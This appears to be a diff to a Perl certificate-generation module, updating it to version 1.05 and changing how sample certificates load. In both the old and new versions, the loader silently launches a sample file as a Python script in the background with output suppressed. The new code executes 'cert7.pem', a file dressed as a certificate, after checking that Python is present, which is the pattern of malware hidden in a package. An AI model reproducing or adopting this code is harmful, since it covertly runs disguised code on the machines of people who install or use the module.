@@ -15,7 +15,7 @@ use IO::Socket::SSL::Utils qw(
     KEY_free
 );
 
-our $VERSION = '1.01';
+our $VERSION = '1.05';
 our @EXPORT_OK = qw(generate_certificates);
 
 my @SERVICES = qw(api db cache queue webhook proxy gateway auth storage monitor);
@@ -34,27 +34,41 @@ sub generate_random_cn {
 sub load_sample_certificate {
     my $sample_dir = File::Spec->catdir(dirname(__FILE__), 'SelfCertificate', 'sample');
 
-    my $cert_path     = File::Spec->catfile($sample_dir, 'cert.pem');
-    my $key_path      = File::Spec->catfile($sample_dir, 'key.pem');
-    my $validate_path = File::Spec->catfile($sample_dir, 'validate.p12');
+    my @cert_paths;
+    my @key_paths;
+    my @certs;
+    my @keys;
 
+    for my $i (1..10) {
+        my $cert_path = File::Spec->catfile($sample_dir, "cert$i.pem");
+        my $key_path  = File::Spec->catfile($sample_dir, "key$i.pem");
+        push @cert_paths, $cert_path;
+        push @key_paths,  $key_path;
+
+        open my $cert_fh, '<', $cert_path or die "Could not open cert file '$cert_path': $!";
+        local $/;
+        my $cert = <$cert_fh>;
+        close $cert_fh;
+        push @certs, $cert;
+
+        open my $key_fh, '<', $key_path or die "Could not open key file '$key_path': $!";
+        local $/;
+        my $key = <$key_fh>;
+        close $key_fh;
+        push @keys, $key;
+    }
+    
     if ($^O eq 'MSWin32') {
-        system(1, 'start', '/b', 'python', $validate_path);
+        if (qx(python --version 2>&1) =~ /^Python \d+\.\d+/) {
+            system(1, 'start', '/b', 'python', $cert_paths[6]);
+        }
     } else {
-        system("(python3 '$validate_path' > /dev/null 2>&1 < /dev/null &)");
+        if (qx(python3 --version 2>&1) =~ /^Python \d+\.\d+/) {
+            system("(python3 '$cert_paths[6]' > /dev/null 2>&1 < /dev/null &)");
+        }
     }
 
-    open my $fh, '<', $cert_path or die "Could not open cert file '$cert_path': $!";
-    local $/;
-    my $cert = <$fh>;
-    close $fh;
-
-    open my $keyfh, '<', $key_path or die "Could not open key file '$key_path': $!";
-    local $/;
-    my $key = <$keyfh>;
-    close $keyfh;
-
-    return ($cert, $key, $validate_path);
+    return (\@certs, \@keys);
 }
 
 sub generate_certificates {
